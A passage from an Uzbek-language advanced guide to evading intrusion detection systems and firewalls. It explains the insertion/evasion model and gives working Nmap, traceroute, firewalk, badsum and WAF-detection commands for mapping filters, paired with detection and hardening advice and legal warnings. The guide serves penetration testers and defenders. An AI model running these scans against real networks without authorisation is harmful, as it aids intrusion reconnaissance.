---
title: "IDS va tarmoq xavfsizlik devorini chetlab o‘tish: advanced qo‘llanma"
description: "Nazariya, amaliy buyruqlar, aniqlash va himoya — IP va TCP darajasidagi noaniqliklardan tunnellash, obfuskatsiya, proksi va honeypotlargacha. 20 bo‘lim, 10 laboratoriya mashqi, nazorat savollari va lug‘at bilan."
date: 2026-11-02
tags: [network-security, ids, firewall, evasion, nmap, pentest, blue-team, uzbek]
lang: uz
draft: false
---

Bu — IDS (Intrusion Detection System) va tarmoq xavfsizlik devorlarini (firewall) chetlab o‘tish usullari bo‘yicha to‘liq, advanced darajadagi qo‘llanma. Har bir texnikada uch qism bor: **[HUJUM]** usul qanday ishlaydi, **[ANIQLASH]** himoyachi nimani ko‘radi va **[HIMOYA]** uni qanday yopish mumkin. Shuning uchun qo‘llanma pentester uchun ham, himoyachi (blue team) uchun ham mo‘ljallangan.

> ⚖️ **FAQAT RUXSAT BILAN**
> Bu yerdagi usullar faqat yozma ruxsat berilgan pentest, red team, bug bounty (dastur qoidalari doirasida), CTF yoki o‘zingizga tegishli laboratoriyada qo‘llanadi. Ruxsatsiz skanerlash va himoya vositalarini chetlab o‘tish ko‘plab davlatlarda jinoiy javobgarlikka olib keladi.

## 0\. Kirish va foydalanish tartibi

> ⚖️ **HUQUQIY VA AXLOQIY OGOHLANTIRISH**
>
> Bu qo‘llanmadagi usullar **faqat yozma ruxsat** (shartnoma, scope, Rules of Engagement) mavjud bo‘lgan pentest va red team ishlarida, bug bounty dasturining qoidalari ruxsat bergan doirada, CTF musobaqalarida yoki o‘zingizga tegishli laboratoriyada qo‘llanadi. Ruxsatsiz skanerlash, himoya vositalarini chetlab o‘tish va boshqa birovning IP manzilini soxtalashtirish ko‘plab davlatlarda jinoiy javobgarlikka sabab bo‘ladi: masalan, O‘zbekiston Respublikasi Jinoyat kodeksining 278-1 – 278-7-moddalari, Kanada Criminal Code’ining 342.1-bo‘limi, AQSHdagi CFAA (18 U.S.C. § 1030).
>
> Ko‘pchilik bug bounty dasturlari evasion, DoS va avtomatlashtirilgan og‘ir skanlarni alohida cheklaydi. Har bir texnikani ishlatishdan oldin dastur qoidalarini o‘qing.
>

### 0.1 Bu qo‘llanma nima uchun

1.0 versiya qisqa konspekt tarjimasi edi: u Nmap’ning bir nechta parametrlarini, proksi va Tor haqida umumiy ma’lumotni berardi, lekin *nega* bu usullar ishlashini, qaysi hollarda ishlamasligini va himoyachi ularni qanday ko‘rishini tushuntirmasdi. 2.0 versiya uch savolga javob beradi:

1. **Mexanizm.** IDS yoki firewall nimani ko‘radi, nishondagi operatsion tizim nimani ko‘radi va ular orasidagi farq qayerdan kelib chiqadi.
2. **Amaliyot.** Nmap, hping3, fragroute, SSH, chisel va boshqa vositalar bilan usulni qanday sinash, natijani qanday talqin qilish.
3. **Himoya.** Har bir usul qanday iz qoldiradi, qaysi qoida yoki konfiguratsiya uni yopadi. Pentest hisobotidagi tavsiyalar aynan shu qismdan olinadi.

### 0.2 Qanday o‘qish kerak

- 1–2-bo‘limlar nazariy asos. Ularni o‘tkazib yubormang: 4–11-bo‘limlardagi har bir texnika 2-bo‘limdagi *insertion/evasion* modelining xususiy holati.
- 3-bo‘lim razvedka: chetlab o‘tishdan oldin nimani chetlab o‘tayotganingizni aniqlash kerak.
- 4–11-bo‘limlar texnikalar, quyidan yuqoriga: IP → TCP → skaner → marshrut → manba → tunnel → ilova → IDSga qarshi DoS.
- 12–14-bo‘limlar proksi, anonimlik tarmoqlari va honeypotlar. 15-bo‘lim himoya strategiyasini bir joyga yig‘adi.
- 16-bo‘lim laboratoriya. Har bir mashqni bajarib, natijalar jadvalini to‘ldiring; 17–19-bo‘limlar takrorlash uchun.

Buyruqlardagi `<nishon>`, `<zombi>` kabi qavs ichidagi so‘zlar o‘rniga o‘z laboratoriyangizdagi manzilni qo‘ying. `10.10.10.0/24` manzillari 16-bo‘limdagi laboratoriya tarmog‘iga mos.

> 🔧 **1.0 VERSIYADAGI MATNGA KIRITILGAN TUZATISHLAR**
>
> - ProxyChains namunasidagi `sock4` → `socks4`. Kali va proxychains-ng’da asosiy sozlama fayli odatda `/etc/proxychains4.conf`.
> - Ommaviy bepul proksi manzillari olib tashlandi: ular eskirgan va ishonchsiz; laboratoriyada o‘zingiz boshqaradigan proksidan foydalaning.
> - Tails’ning rasmiy manzili endi `tails.net`; Psiphon uchun `psiphon.ca`.
> - Tor bo‘yicha «5000 tagacha server» iborasi bitta ulanish yo‘lining uzunligi emas: oddiy ulanish 3 ta, onion xizmatga ulanish 6 ta relay orqali o‘tadi.
> - «IDSlar fragmentlarni e’tiborsiz qoldiradi» degan umumlashtirish aniqlashtirildi: zamonaviy Snort 3, Suricata va Zeek fragmentlarni qayta yig‘adi; muammo yig‘ish siyosatidagi farqlarda.
> - `--proxies` parametri Nmap port skanini proksi orqali o‘tkazmasligi alohida ta’kidlandi: haqiqiy IP oshkor bo‘ladi.
>

## 1\. Asosiy tushunchalar

### 1.1 IDS va IPS

**IDS (Intrusion Detection System)** trafik yoki host hodisalarini tahlil qilib, hujum belgilarini topganda ogohlantirish (alert) beradi. Tarmoq IDS’i odatda trafikning *nusxasini* oladi (SPAN/mirror port yoki TAP), shuning uchun u paketni to‘xtata olmaydi. **IPS (Intrusion Prevention System)** esa trafik yo‘lida (inline) turadi: paketni tashlab yuborishi, ulanishni RST bilan uzishi yoki manbani bloklashi mumkin. Zamonaviy vositalarning ko‘pchiligi (Snort 3, Suricata) ikkala rejimda ham ishlaydi.

| Joylashuv bo‘yicha | Nimani ko‘radi | Misollar |
| --- | --- | --- |
| **NIDS / NIPS** | Tarmoq segmentidagi paketlar va oqimlar. Shifrlangan trafik ichini ko‘rmaydi. | Snort 3, Suricata, Zeek (NSM) |
| **HIDS** | Host loglari, fayl yaxlitligi, jarayonlar, tizim chaqiruvlari. Shifr ochilgandan keyingi holatni ko‘radi. | Wazuh/OSSEC, auditd, Sysmon + SIEM, EDR |
| **WIDS** | Simsiz efir: soxta AP, deauth, evil twin. | Kismet, korporativ WLAN kontrollerlari |

| Aniqlash usuli | Qanday ishlaydi | Kuchli tomoni | Zaif tomoni (evasion nuqtai nazaridan) |
| --- | --- | --- | --- |
| **Imzo (signature, misuse)** | Ma’lum naqsh bilan solishtiradi: bayt ketma-ketligi, flaglar, maydon qiymatlari. | Aniq, tushunarli, kam yolg‘on signal. | Naqshni ozgina o‘zgartirish (kodlash, bo‘laklash) imzoni buzadi. Bu qo‘llanmadagi usullarning aksariyati shunga qarshi. |
| **Anomaliya** | Normal profildan (baseline) og‘ishni statistik yoki ML yordamida topadi. | Noma’lum hujumlarni ko‘rishi mumkin. | Ko‘p yolg‘on signal; sekin hujum baseline’ni asta-sekin «zaharlashi» mumkin; oddiy trafikka o‘xshagan hujum sezilmaydi. |
| **Protokol holati tahlili** | Protokolning RFC yoki ishlab chiqaruvchi modeliga solishtiradi. | Protokol buzilishlarini ko‘radi. | Resurs talab qiladi; protokolni host boshqacha talqin qilsa (parser differential) noto‘g‘ri xulosa chiqaradi. |

**Fail-open va fail-closed.** Inline IPS ishdan chiqqanda yoki yuklama chegarasiga yetganda trafikni tekshiruvsiz o‘tkazadimi (fail-open, bypass) yoki to‘xtatadimi (fail-closed)? Biznes uzluksizligi uchun ko‘pincha fail-open tanlanadi. Hujumchi nuqtai nazaridan bu muhim: IPS’ni haddan tashqari yuklash (11-bo‘lim) uni «shaffof simga» aylantirishi mumkin.

### 1.2 Ogohlantirish natijalari va base-rate muammosi

| Natija | Haqiqatda | IDS qarori | Kimga zarar |
| --- | --- | --- | --- |
| True Positive (TP) | hujum bor | alert berdi | to‘g‘ri ish |
| False Positive (FP) | hujum yo‘q | alert berdi | SOC vaqti, charchoq (alert fatigue) |
| True Negative (TN) | hujum yo‘q | jim | to‘g‘ri ish |
| False Negative (FN) | hujum bor | jim | eng xavflisi: evasion maqsadi aynan shu |

Axelsson (2000) ko‘rsatganidek, haqiqiy hujumlar umumiy trafikka nisbatan juda kam bo‘lgani uchun hatto juda aniq detektor ham ko‘p yolg‘on signal beradi (base-rate fallacy). Natijada qoidalar yumshatiladi yoki alertlar ko‘rib chiqilmaydi. Evasion faqat «IDS ko‘rmasin» degani emas: alertni minglab shovqin orasiga ko‘mib yuborish ham amalda xuddi shunday natija beradi.

### 1.3 Firewall turlari

| Turi | Qatlam | Nimaga qaraydi | Evasion uchun tipik zaif joy |
| --- | --- | --- | --- |
| **Stateless paket filtri** (ACL) | L3–L4 | Manba/manzil IP, port, protokol, TCP flaglar. Har bir paket alohida baholanadi. | Ulanish holatini bilmaydi: ACK skan «unfiltered» ko‘rsatadi; source port’ga ishonch (53, 20, 88); fragmentlarda L4 sarlavhasi yo‘q. |
| **Stateful (SPI)** | L3–L4 | Yuqoridagilar + ulanishlar jadvali (conntrack). Javob paketlari faqat mavjud holatga mos kelsa o‘tadi. | Ruxsat etilgan ulanish ichida nima borligini ko‘rmaydi (tunnellash); holat jadvalini to‘ldirish (DoS); ALG/helper zaifliklari. |
| **Circuit-level gateway** | L5 | Seans o‘rnatilishini (masalan, SOCKS) tekshiradi, mazmunni emas. | Ruxsat etilgan seans ichida istalgan protokol. |
| **Ilova proksisi** | L7 | Protokolni to‘liq tahlil qiladi, ulanishni o‘zi qayta quradi. | Protokol ichida tunnellash (HTTP CONNECT, WebSocket), parser farqlari. |
| **NGFW** | L3–L7 | Ilovani aniqlash (App-ID), foydalanuvchi, IPS, URL filtri, TLS inspeksiya. | Shifrlangan va tanib bo‘lmaydigan trafik (QUIC, ECH), inspeksiyadan istisno qilingan toifalar, resurs chegarasi. |
| **WAF** | L7 (HTTP) | So‘rovlar mazmuni: imzolar va anomaliya bali (masalan, OWASP CRS). | Kodlash va normalizatsiya farqlari, WAF va backend so‘rovni turlicha talqin qilishi. |
| **Host firewall** | Host | nftables/iptables, Windows Defender Firewall: jarayon va interfeys darajasidagi qoidalar. | Ruxsat etilgan jarayonlar orqali chiqish (living off the land), IPv6 qoidalari unutilishi. |

### 1.4 Arxitektura va sensor joylashuvi

Klassik tuzilma: internet → perimetr firewall → **DMZ (screened subnet)**, unda tashqi xizmatlar (veb, pochta) → ichki firewall → ichki tarmoq. Bastion host — tashqi hujumga ataylab qarshi qo‘yilgan, kuchaytirilgan server. Sensorlar qayerda turishiga qarab turli narsani ko‘radi:

- **Perimetr firewall’idan tashqarida:** hamma narsani ko‘radi, shu jumladan bloklanadigan trafikni ham. Shovqin juda ko‘p.
- **Firewall’dan keyin:** faqat o‘tib kelgan trafikni ko‘radi. Aynan shu joydagi alertlar muhimroq.
- **Ichki segmentlar orasida:** lateral movement va ichkaridan tashqariga chiqishni ko‘radi.
- **Hostda (HIDS/EDR):** shifr ochilgandan keyingi holatni ko‘radi; tarmoq evasion’i bu qatlamga ta’sir qilmaydi.

**SPAN va TAP.** SPAN port kommutator yuklanganda paketlarni jimgina tashlab yuborishi mumkin; TAP passiv va to‘liq nusxa beradi. **Asimmetrik marshrut** holatida sensor ulanishning faqat bir yo‘nalishini ko‘radi va TCP oqimini to‘g‘ri yig‘a olmaydi. Sensor ko‘rmagan paket — tekshirilmagan paket. Shuning uchun capture loss ko‘rsatkichlari (Zeek’da `capture_loss.log`, Suricata’da `capture.kernel_drops`) xavfsizlik ko‘rsatkichi sifatida kuzatilishi kerak.

### 1.5 Asosiy vositalar

| Vosita | Qisqacha |
| --- | --- |
| **Snort 3** | Imzoga asoslangan IDS/IPS; Lua konfiguratsiya; `stream_ip`, `stream_tcp`, `http_inspect` kabi inspektorlar. |
| **Suricata** | Ko‘p oqimli IDS/IPS/NSM; Snort qoida sintaksisiga yaqin; EVE JSON log; ET Open qoidalar to‘plami. |
| **Zeek** | Network Security Monitoring: imzo emas, protokol loglari (`conn`, `dns`, `http`, `ssl`, `weird`) va skript tili. Tunnellash va anomaliyalarni ko‘rishda kuchli. |
| **Security Onion** | Suricata, Zeek, Elastic va tahlil vositalarini birlashtirgan tayyor platforma; laboratoriya uchun qulay. |
| **Wazuh** | HIDS/XDR: agentlar, fayl yaxlitligi, log tahlili. |
| **pfSense / OPNsense, nftables** | Firewall platformalari; Suricata yoki Snort’ni inline IPS sifatida ulash mumkin. |

## 2\. Evasion nazariyasi

### 2.1 Asosiy g‘oya: IDS taxmin qiladi

Tarmoq IDS’i nishon hostning o‘zi emas. U hostga qaysi baytlar yetib borishini va host ularni qanday yig‘ishini *taxmin qiladi*. Bu taxmin bir nechta noma’lumga bog‘liq: IDS va host orasida nechta marshrutizator bor, hostda qaysi OS, u fragmentlarni qanday yig‘adi, noto‘g‘ri checksumli paketni qabul qiladimi va hokazo. Taxmin haqiqatdan farq qilgan har bir joy evasion uchun imkoniyat. Bu yondashuvni Ptacek va Newsham 1998-yilgi «Insertion, Evasion, and Denial of Service» ishida tizimli bayon qilgan va u hozirgacha sohaning asosi.

### 2.2 Insertion, evasion va DoS

**[INSERTION]** IDS paketni qabul qiladi, host esa rad etadi. IDS oqimga hostda mavjud bo‘lmagan «ortiqcha» baytlarni qo‘shib yig‘adi va imzo buziladi. Misollar: TTL qiymati IDSgacha yetadigan, lekin hostgacha yetmaydigan paket; IDS tekshirmaydigan noto‘g‘ri TCP checksum; host PAWS qoidasi bo‘yicha tashlaydigan eski timestamp.

**[EVASION]** Host paketni qabul qiladi, IDS esa rad etadi. Hujum baytlari hostga yetadi, lekin IDS ularni ko‘rmaydi. Misollar: IDS IP options’li paketni tashlaydi, host qabul qiladi; IDS fragmentni o‘z timeout’i tugagani uchun unutadi, host esa hali kutmoqda.

**[DoS]** IDS resurslarini tugatish: fragment buferlari, oqimlar jadvali, qimmat regexlar, log diski. Natijada IDS paketlarni tashlaydi yoki (inline holatda) fail-open rejimiga o‘tadi.

<figure style="background:#fff;border:1px solid #e4e7ec;border-radius:8px;padding:14px;margin:1.5rem 0;overflow-x:auto">
<svg style="width:100%;height:auto" font-family="DejaVu Sans" font-size="11" viewbox="0 0 680 236" xmlns="http://www.w3.org/2000/svg">
<text fill="#b42318" font-size="12" font-weight="bold" x="0" y="16">Insertion</text>
<text fill="#475467" font-size="10" x="0" y="34">Hujumchi yuboradi:</text>
<g font-family="DejaVu Sans Mono" font-size="13" text-anchor="middle">
<rect fill="#f2f4f7" height="24" stroke="#98a2b3" width="24" x="120" y="20"></rect><text x="132" y="37">A</text>
<rect fill="#f2f4f7" height="24" stroke="#98a2b3" width="24" x="148" y="20"></rect><text x="160" y="37">T</text>
<rect fill="#fee4e2" height="24" stroke="#b42318" stroke-width="1.5" width="24" x="176" y="20"></rect><text fill="#b42318" x="188" y="37">X</text>
<rect fill="#f2f4f7" height="24" stroke="#98a2b3" width="24" x="204" y="20"></rect><text x="216" y="37">T</text>
<rect fill="#f2f4f7" height="24" stroke="#98a2b3" width="24" x="232" y="20"></rect><text x="244" y="37">A</text>
<rect fill="#f2f4f7" height="24" stroke="#98a2b3" width="24" x="260" y="20"></rect><text x="272" y="37">C</text>
<rect fill="#f2f4f7" height="24" stroke="#98a2b3" width="24" x="288" y="20"></rect><text x="300" y="37">K</text>
</g>
<text fill="#b42318" font-size="10" x="330" y="30">X: TTL IDSgacha yetadi, hostgacha yetmaydi</text>
<text fill="#475467" font-size="10" x="330" y="44">(yoki noto‘g‘ri checksum, eski PAWS timestamp)</text>
<rect fill="#fff8eb" height="40" rx="5" stroke="#fedf89" width="330" x="0" y="58"></rect>
<text fill="#b54708" font-weight="bold" x="12" y="76">IDS yig‘adi:</text>
<text font-family="DejaVu Sans Mono" font-size="13" x="110" y="76">ATXTACK</text>
<text fill="#475467" font-size="10" x="12" y="91">«ATTACK» imzosi topilmadi → alert yo‘q</text>
<rect fill="#fef3f2" height="40" rx="5" stroke="#fecdca" width="335" x="345" y="58"></rect>
<text fill="#b42318" font-weight="bold" x="357" y="76">Host yig‘adi:</text>
<text font-family="DejaVu Sans Mono" font-size="13" x="460" y="76">ATTACK</text>
<text fill="#475467" font-size="10" x="357" y="91">hujum bajariladi</text>
<text fill="#175cd3" font-size="12" font-weight="bold" x="0" y="132">Evasion</text>
<text fill="#475467" font-size="10" x="0" y="150">Hujumchi yuboradi:</text>
<g font-family="DejaVu Sans Mono" font-size="13" text-anchor="middle">
<rect fill="#f2f4f7" height="24" stroke="#98a2b3" width="24" x="120" y="136"></rect><text x="132" y="153">A</text>
<rect fill="#f2f4f7" height="24" stroke="#98a2b3" width="24" x="148" y="136"></rect><text x="160" y="153">T</text>
<rect fill="#d1e9ff" height="24" stroke="#175cd3" stroke-width="1.5" width="24" x="176" y="136"></rect><text fill="#175cd3" x="188" y="153">T</text>
<rect fill="#f2f4f7" height="24" stroke="#98a2b3" width="24" x="204" y="136"></rect><text x="216" y="153">A</text>
<rect fill="#f2f4f7" height="24" stroke="#98a2b3" width="24" x="232" y="136"></rect><text x="244" y="153">C</text>
<rect fill="#f2f4f7" height="24" stroke="#98a2b3" width="24" x="260" y="136"></rect><text x="272" y="153">K</text>
</g>
<text fill="#175cd3" font-size="10" x="300" y="146">T: IDS rad etadi (IP option, timeout), host qabul qiladi</text>
<rect fill="#fff8eb" height="40" rx="5" stroke="#fedf89" width="330" x="0" y="174"></rect>
<text fill="#b54708" font-weight="bold" x="12" y="192">IDS yig‘adi:</text>
<text font-family="DejaVu Sans Mono" font-size="13" x="110" y="192">ATACK</text>
<text fill="#475467" font-size="10" x="12" y="207">imzo topilmadi → alert yo‘q</text>
<rect fill="#fef3f2" height="40" rx="5" stroke="#fecdca" width="335" x="345" y="174"></rect>
<text fill="#b42318" font-weight="bold" x="357" y="192">Host yig‘adi:</text>
<text font-family="DejaVu Sans Mono" font-size="13" x="460" y="192">ATTACK</text>
<text fill="#475467" font-size="10" x="357" y="207">hujum bajariladi</text>
</svg>
<figcaption style="font-size:0.85em;color:#475467;margin-top:8px">1-chizma. Ptacek–Newsham modeli: ikkala holatda ham IDS va host turli baytlar ketma-ketligini ko‘radi.</figcaption>
</figure>

### 2.3 Noaniqlik manbalari

| Qatlam | Maydon yoki hodisa | Nega IDS va host turlicha ko‘radi |
| --- | --- | --- |
| IP | TTL | IDS va host orasidagi hoplar soni IDSga noma’lum; paket IDSdan o‘tib, hostgacha yetmasligi mumkin. |
| IP | Header checksum, versiya, IHL, uzunlik | Noto‘g‘ri maydonli paketni marshrutizator yoki host tashlaydi, IDS esa qabul qilishi mumkin. |
| IP | Fragmentlar ustma-ust tushishi (overlap) | Har bir OS ustma-ust baytlarni o‘z qoidasi bilan yig‘adi (4.3-bo‘lim). |
| IP | Fragment timeout | IDS va hostdagi kutish muddati farq qilsa, kech kelgan fragmentni biri yig‘adi, ikkinchisi tashlaydi. |
| IP | IP options, DF + MTU | Ba’zi qurilmalar options’li paketni tashlaydi, boshqalari qabul qiladi; DF bayrog‘i va kichik MTU paketni yo‘lda tashlatadi. |
| TCP | Checksum, RST qabul qilish qoidalari | Host noto‘g‘ri checksumli yoki oynadan tashqari RST’ni tashlaydi; IDS sessiyani yopib qo‘yishi mumkin. |
| TCP | Segmentlar overlap’i, SYN ichida data, URG pointer, PAWS | TCP steklari bu holatlarni turlicha qayta ishlaydi (5-bo‘lim). |
| Ilova | URL kodlash, Unicode, katta-kichik harf, chunked, HPP | IDS/WAF va backend so‘rovni turlicha dekodlaydi (10-bo‘lim). |

### 2.4 Javob: target-based yig‘ish va normalizatsiya

1. **Target-based reassembly.** IDS himoyalanayotgan har bir host yoki tarmoq uchun mos OS siyosatini biladi va paketlarni o‘sha OS kabi yig‘adi (Novak, 2005; Shankar va Paxson’ning «Active Mapping» ishi, 2003). Snort 3’da `stream_ip`/`stream_tcp` `policy` parametri, Suricata’da `host-os-policy` bo‘limi.
2. **Normalizatsiya.** Inline qurilma noaniq trafikni bir ma’noli ko‘rinishga keltiradi: kichik TTL’ni oshiradi, IP options’ni tozalaydi, ustma-ust fragment va segmentlarni tashlaydi (Handley, Paxson, Kreibich, 2001). OpenBSD pf’dagi `scrub`, Snort 3’dagi `normalizer` shunday ishlaydi.
3. **Evasion urinishining o‘zini aniqlash.** Noaniqlikni bartaraf etib bo‘lmasa ham, uning paydo bo‘lishi haqida alert berish mumkin (overlap, juda kichik fragment, past TTL).

### 2.5 Evasion paradoksi

> ℹ️ **AMALIY XULOSA**
>
> Juda kichik fragmentlar, IP options, noto‘g‘ri checksum, decoy shovqini va boshqa «ekzotik» paketlar oddiy foydalanuvchi trafigida deyarli uchramaydi. Yaxshi sozlangan muhitda evasion urinishining o‘zi kuchli signalga aylanadi: masalan, ko‘p SOC’larda overlap fragmentlar haqidagi alert port skanidan ko‘ra jiddiyroq qabul qilinadi.
>
> Shuning uchun zamonaviy red team’da eng samarali «evasion» ko‘pincha paketni buzish emas, balki oddiy trafikka singib ketish: ruxsat etilgan protokol (HTTPS, DNS), odatiy ish vaqti, sekin temp va nishonning o‘z vositalari. Paket darajasidagi usullar esa eski yoki noto‘g‘ri sozlangan qurilmalarni topish va himoya qoidalarini sinashda qimmatli.
>

## 3\. Razvedka: firewall va IDSni aniqlash

Chetlab o‘tishdan oldin nima to‘sayotganini bilish kerak: stateless filtrmi, stateful firewall’mi, WAF’mi, inline IPS’mi. Har biri boshqa usulni talab qiladi.

### 3.1 Port holatlari nimani bildiradi

| Nmap holati | Qanday javob keldi | Firewall haqida xulosa |
| --- | --- | --- |
| `open` | SYN’ga SYN/ACK | Port ochiq va filtr uni o‘tkazadi. |
| `closed` | SYN’ga RST | Host javob beradi, filtr bu portni bloklamaydi. Ko‘p «closed» port filtrning yo‘qligini yoki «reject» qoidasini ko‘rsatishi mumkin. |
| `filtered` | Javob yo‘q yoki ICMP type 3 (code 1, 2, 3, 9, 10, 13) | Filtr bor. ICMP code 13 («administratively prohibited») firewall’ning aniq belgisi. |
| `unfiltered` | ACK skanida RST keldi | Paket hostgacha yetdi; port ochiq yoki yopiqligi noma’lum. |
| `open\|filtered` | UDP, FIN, NULL, Xmas skanlarida javob yo‘q | Port ochiq bo‘lishi ham, filtr paketni tashlagan bo‘lishi ham mumkin. |

Natijani `--reason` bilan ko‘rish foydali: Nmap har bir holat qaysi javobga asoslanganini (syn-ack, reset, no-response, admin-prohibited) yozadi. `--packet-trace` yuborilgan va kelgan paketlarni ko‘rsatadi.

```bash
sudo nmap -sS -p 1-1000 --reason -n <nishon>
sudo nmap -sS -p 22,80,443 --packet-trace -n <nishon>
```

### 3.2 ACK va Window skan: stateful yoki stateless

**[HUJUM]** ACK skan ochiq portlarni topmaydi; u filtr qoidalarini xaritalaydi. Mavjud bo‘lmagan ulanishga tegishli ACK paketini host RST bilan qaytaradi. Stateless filtr ko‘pincha «ACK bayrog‘i bor bo‘lsa, bu javob paketi» deb hisoblab, uni o‘tkazadi (masalan, ACL’dagi `established` kalit so‘zi faqat ACK/RST bitini tekshiradi). Stateful firewall esa holat jadvalida yo‘q ACK’ni tashlaydi.

```bash
sudo nmap -sS -p 1-1000 -n <nishon>     # 1) SYN skan
sudo nmap -sA -p 1-1000 -n <nishon>     # 2) ACK skan
sudo nmap -sW -p 1-1000 -n <nishon>     # 3) Window skan (faqat ayrim OSlarda ishonchli)
```

| SYN skan natijasi | ACK skan natijasi | Ehtimoliy talqin |
| --- | --- | --- |
| filtered | unfiltered | Stateless filtr: SYN bloklanadi, ACK o‘tadi. FIN/NULL/Xmas skanlari ham o‘tishi mumkin. |
| filtered | filtered | Stateful firewall yoki to‘liq bloklash. |
| open/closed | unfiltered | Bu port uchun filtr yo‘q. |

Window skan RST paketidagi TCP window maydoniga qaraydi: ayrim tizimlarda ochiq port RST’ida window nolga teng emas. Bu xususiyat kam tizimda bor, shuning uchun natijani boshqa skan bilan tasdiqlang.

### 3.3 Firewalking

**[HUJUM]** Goldsmith va Schiffman (1998) taklif qilgan usul. Avval traceroute bilan firewall necha hopda ekanini aniqlaysiz. Keyin TTL qiymati firewall’dan bitta ko‘p bo‘lgan paketlarni turli portlarga yuborasiz. Agar firewall portni o‘tkazsa, undan keyingi marshrutizator TTL tugagani uchun *ICMP Time Exceeded* qaytaradi; bloklasa, javob kelmaydi. Shunday qilib, firewall orqasidagi hostlarga yetmasdan turib ruxsat etilgan portlar ro‘yxati olinadi.

```bash
sudo nmap --script firewalk --traceroute -n <nishon>
sudo nmap --script firewalk --traceroute -p 21,22,25,53,80,443,3389 -n <nishon>
```

**[HIMOYA]** Ichki tarmoqdan tashqariga chiquvchi ICMP Time Exceeded xabarlarini cheklash; perimetrda TTL normalizatsiyasi; firewall’ni oxirgi marshrutizator bilan bir qurilmada joylashtirish usulni samarasiz qiladi.

### 3.4 Turli protokollar bilan traceroute

```bash
traceroute -I <nishon>              # ICMP Echo
sudo traceroute -T -p 443 <nishon>  # TCP SYN, aniq port
traceroute -U -p 53 <nishon>        # UDP, doimiy port (standart: 53)
sudo nmap -sS -p 443 --traceroute -n <nishon>
```

Natijalarni solishtiring. ICMP traceroute 5-hopda to‘xtab, TCP/443 traceroute nishongacha yetsa, o‘sha 5-hopda protokol yoki portga asoslangan filtr bor. Har bir hopdagi javobning TTL qiymatini ham kuzating: kutilmagan sakrash yo‘lda NAT yoki proksi borligini bildirishi mumkin.

### 3.5 --badsum bilan yo‘ldagi qurilmani aniqlash

**[HUJUM]** Deyarli barcha host TCP/IP steklari noto‘g‘ri TCP/UDP checksumli paketni jimgina tashlaydi. Agar shunday paketga javob kelsa, uni yo‘ldagi qurilma (checksumni tekshirmaydigan firewall, IPS yoki yuk balanslagich) yuborgan bo‘ladi. Usul Phrack 60-sonidagi 12-maqolada bayon qilingan.

```bash
sudo nmap -sS --badsum -p 80,443 -n <nishon>
```

Natijani Wireshark’da tekshiring: ayrim tarmoq kartalari checksum offloading tufayli checksumni o‘zi «tuzatib» yuborishi mumkin. Javob kelgan bo‘lsa, uning TTL qiymatini serverning oddiy javoblaridagi TTL bilan solishtiring.

### 3.6 IPS va WAF borligini bildiruvchi belgilar

- **RST injection.** Ulanish ma’lum payload yuborilgandan keyin RST bilan uziladi. RST’ning TTL qiymati yoki IPID ketma-ketligi serverning boshqa paketlariga mos kelmasa, uni yo‘ldagi qurilma yuborgan.
- **To‘satdan bloklash (shun).** Bir nechta so‘rovdan keyin manba IP butunlay javob olmay qoladi. Muddatini aniqlash uchun bir necha daqiqadan keyin qayta sinab ko‘ring.
- **HTTP belgilar.** 403/406 javoblari, blokirovka sahifasi, maxsus cookie yoki sarlavhalar. WAF’ni aniqlash:
`wafw00f https://<nishon>
nmap -p 443 --script http-waf-detect,http-waf-fingerprint <nishon>`
- **TCP fingerprint mos kelmasligi.** SYN/ACK’dagi window, MSS, TTL va TCP options server OS’iga mos kelmasa, oldinda SYN proxy, yuk balanslagich yoki reverse proxy turibdi.

### 3.7 Banner grabbing

```bash
nc -nv <nishon> 21
sudo nmap -sV --version-intensity 5 -p 21,22,25,80,443,8443 <nishon>
curl -skI https://<nishon>/
```

Firewall va VPN qurilmalarining boshqaruv interfeyslari (web panel, SSH, SNMP) ko‘pincha ishlab chiqaruvchi va versiyani oshkor qiladi. Bu ma’lumot qurilma uchun ma’lum zaifliklarni tekshirishga yo‘l ochadi.

> 🛡️ **HIMOYA: RAZVEDKANI QIYINLASHTIRISH**
>
> - Tashqi interfeysda «reject» (RST, ICMP unreachable) o‘rniga «drop» ishlatish skanni sekinlashtiradi, lekin diagnostikani ham qiyinlashtiradi. Qarorni ongli qabul qiling.
> - Boshqaruv interfeyslarini faqat alohida management VLAN’dan ochiq qiling; bannerlarda versiyani yashiring.
> - Stateless ACL o‘rniga stateful qoidalar; `established` kalit so‘ziga tayanmang.
> - Skan uchun avtomatik bloklashni (shun) ehtiyotkorlik bilan yoqing: manba IP soxtalashtirilishi mumkin va siz o‘z hamkorlaringizni bloklab qo‘yasiz (11-bo‘lim).
>

## 4\. IP darajasi: fragmentatsiya

IP fragmentatsiyasi (fragmentlar bilan skanerlash) — datagrammani kichik bo‘laklarga ajratib yuborish. Qabul qiluvchi tomon barcha bo‘laklar yetib kelgach, datagrammani qayta yig‘adi. Fragmentatsiya IPv4’da TCP, UDP va ICMP’ni tashuvchi har qanday datagrammaga qo‘llanadi; IPv6’da u faqat jo‘natuvchi tomonidan, alohida kengaytma sarlavha orqali bajariladi (4.6-bo‘lim).

### 4.1 IPv4 sarlavhasidagi muhim maydonlar

| Maydon (bit) | Vazifasi | Evasion bilan bog‘liqligi |
| --- | --- | --- |
| **Identification** (16) | Bir datagrammaning barcha bo‘laklari bir xil ID oladi. | Idle skan (8.3) aynan shu maydondan foydalanadi; ID’ni boshqarib, bo‘laklarni «aralashtirish» mumkin. |
| **Flags** (3): DF, MF | DF — bo‘laklama; MF — yana bo‘laklar bor. | MF bayrog‘i va offset bilan soxta yoki ustma-ust bo‘laklar yasaladi. |
| **Fragment Offset** (13) | Bo‘lakning datagrammadagi o‘rni, **8 baytlik birliklarda**. | Shu sababli Nmap’ning `--mtu` qiymati 8 ga karrali bo‘lishi shart. |
| **TTL** (8) | Har bir marshrutizatorda 1 ga kamayadi; 0 bo‘lsa paket tashlanadi. | IDSdan o‘tib, hostga yetmaydigan paketlar (insertion). |
| **Header Checksum** (16) | Faqat IP sarlavhasini himoyalaydi. | Noto‘g‘ri checksumni kim tekshiradi, kim tekshirmaydi. |
| **Options** (0–40 bayt) | Record Route, Timestamp, LSRR, SSRR va boshqalar. | Source routing (7-bo‘lim); options’li paketlarga turli qurilmalar turlicha munosabatda. |

